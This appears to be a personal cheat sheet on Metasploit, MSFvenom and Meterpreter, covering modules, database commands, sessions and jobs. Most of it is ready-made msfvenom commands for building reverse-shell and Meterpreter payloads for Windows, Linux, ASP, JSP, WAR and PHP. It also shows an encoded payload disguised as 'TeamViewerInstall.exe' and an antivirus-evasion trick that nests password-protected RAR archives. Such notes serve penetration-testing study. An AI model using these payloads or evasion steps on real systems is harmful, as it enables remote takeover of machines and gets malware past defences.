## delete


targeturi = blog
# Architecture
`/usr/share/metasploit-framework `

# Metasploit
```bash
$ msfconsole -q
```

## Modules
Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.

| Type       | Description                                                                       |
|------------|-----------------------------------------------------------------------------------|
| Auxiliary  | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Exploits   | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| Post       | Wide array of modules to gather information, pivot deeper, etc.                   |

```bash
# Search Module 
msf6 > search <KEYWORD>

# Select Module
msf6 > use <PATH>
msf6 > use <NUMBER>

# Show Module Info
msf6 <TYPE>(<Module>) > info

# Show all options
msf6 <TYPE>(<MODULE>) > show options

# Define option to exploit
msf6 <TYPE>(<MODULE>) > set <OPTIONS> <VALUE>

# Run the exploit
msf6 <TYPE>(<MODULE>) > run/exploit

# Run as a job
msf6 <TYPE>(<MODULE>) > run -j 
```

## Targets
Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.

```bash
msf6 > show targets
```

## Payloads
Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.

For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).

- Start with staged payloads 
- Use non-staged payloads if staged payloads fail.

```bash
msf6 > show payloads

msf6 <TYPE>(<MODULE>) > set payload <NUMBER>
```

## Enconders
Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.

```bash
msf6 <TYPE>(<MODULE>) > show encoders
```

## Databases
### Initiate the Database
```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
$ sudo msfdb run
```

### Reinitiate the Database
```bash
$ msfdb reinit
$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
$ sudo service postgresql restart
$ msfconsole -q
```

### Using the Database
#### Database Options
```bash
msf6 > help database
```

#### Workspaces
We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

```bash
msf6 > workspace -h
```

#### Importing Scan Results
```bash
msf6 > db_import Target.xml
```

#### Data Backup
```bash
msf6 > db_export -h
```

#### Hosts
The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. 

```bash
msf6 > hosts -h
```

#### Services
The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.

```bash
msf6 > services -h
```

#### Credentials
The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

```bash
msf6 > creds -h
```

#### Loot
The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

```bash
msf6 > loot -h
```

## Plugins
`/usr/share/metasploit-framework/plugins`

If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:

```bash
msf6 > load <PLUGIN>
```

### Installing New Plugin
```bash
$ sudo cp ./<PLUGIN>.rb /usr/share/metasploit-framework/plugins/<PLUGIN>.rb
```

## Sessions
```bash
# Background the current Session
[CTRL] + [Z]

# List Active Sessions
msf6 <TYPE>(<MODULE>) > sessions

# Start Interaction with Session
msf6 <TYPE>(<MODULE>) > sessions -i 1
```

## Jobs
```bash
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

## Importing Modules
We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.

```bash
$ cp <our_module_here>.rb /usr/share/metasploit-framework/modules/<PATH/><MODULE>.rb
$ msfconsole -m /usr/share/metasploit-framework/modules/
msf6 > loadpath /usr/share/metasploit-framework/modules/
msf6 > reload_all```
```

* * *

# MSFvenom
## List 
```bash
# Payloads
$ msfvenom -l payloads

# #Encoders
$ msfvenom -l encoders 
```

## Staged vs. Stageless Payloads
Staged payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.

Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads.

Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another. This will look like it is all pressed together for a stageless payload. Take our example linux/zarch/meterpreter_reverse_tcp. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. For one last quick example of this naming convention, consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp. The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.

## Payloads
```bash
# Staged Payload for Windows
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
$ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Stageless Payload for Windows
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

# Staged Payload for Linux
$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# Stageless Payload for Linux
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# asp	
$ msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# war
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# php
$ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

## Encoder
### Generating Payload With Encoding
```bash
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

### Multiple Iterations
```bash
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

## Evasion Techniques
```bash
$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
$ rar a ~/test.rar -p ~/test.js

$ mv test.rar test
$ rar a test2.rar -p test
$ mv test2.rar test2
```

* * *

# Meterpreter
The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

```bash
msf6 <TYPE>(<MODULE>) > grep meterpreter show payloads
```

## Meterpreter Shells
windows/meterpreter_reverse_https is actually a much more powerful choice because of the encrypted channel, and it allows you to disconnect the payload (and exit msfconsole) without terminating it. And then the payload will automatically get back to you as soon as you set up the handler again.

### MSFvenom Payloads
```bash
# Staged Payloads for Windows
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Stageless Payloads for Windows
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

# Staged Payloads for Linux
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

# Stageless Payloads for Linux
$ msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

# asp	
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp

# war
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war

# php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
``` 

### Setting Up Multi/Handler
```bash
msf6 > use multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
```

#### Interactive Shells
```bash
meterpreter > shell
```

#### Commands
```bash
meterpreter > help

msf6 > search local_exploit_suggester
meterpreter > search -f "flag.txt"
```
